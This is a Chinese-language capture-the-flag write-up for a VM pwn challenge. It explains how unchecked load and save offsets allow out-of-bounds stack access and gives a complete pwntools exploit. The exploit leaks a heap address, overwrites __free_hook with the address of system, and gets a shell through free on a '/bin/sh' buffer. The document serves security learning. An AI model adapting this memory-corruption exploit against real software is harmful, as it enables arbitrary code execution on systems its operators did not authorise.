## WP

题目是一个功能简单的vm，一共以下几种指令

```python
push = 0x2A3D
pop  = 0xFFFF28
add  = 0x0
sub  = 0x11111
mul  = 0xABCEF
div  = 0x514
load = -1
save = 0x10101010
```

漏洞在于load和save没有对offset进行检查，导致vm stack越界访问和写入，注意到题目是静态编译，并且system也被编译进来了，所以free_hook和system等地址都已知

由于stack->data指向堆，所以需要先利用load将堆地址读入vm stack中，然后和bss上的free_hook进行sub操作，再进行div 4就可以获得堆地址和free_hook之间的偏移，将system地址写入之后，后面触发free(input)的地方就可以执行system("/bin/sh")了

exp:

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1
binary_name = 'bin'

if local:
	cn = process('./'+binary_name)
else:
	cn = remote('',)

ru = lambda x : cn.recvuntil(x)
sn = lambda x : cn.send(x)
rl = lambda   : cn.recvline()
sl = lambda x : cn.sendline(x)
rv = lambda x : cn.recv(x)
sa = lambda a,b : cn.sendafter(a,b)
sla = lambda a,b : cn.sendlineafter(a,b)


bin = ELF('./'+binary_name,checksec=False)


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()
	else:
		pass

push = 0x2A3D
pop  = 0xFFFF28
add  = 0x0
sub  = 0x11111
mul  = 0xABCEF
div  = 0x514
load = -1
save = 0x10101010

system_addr = 0x8051c60
free_hook = 0x80e09f0
def create(d):
    return " ".join([str(x) for x in d])

heap_offset = (0x110-8) // 4
code = create([push,push,push,push,load,push,sub,div,save])
data = create(["/bin/sh",system_addr,4,heap_offset,free_hook])
cn.sendline(code)
cn.sendline(data)
cn.interactive()

```

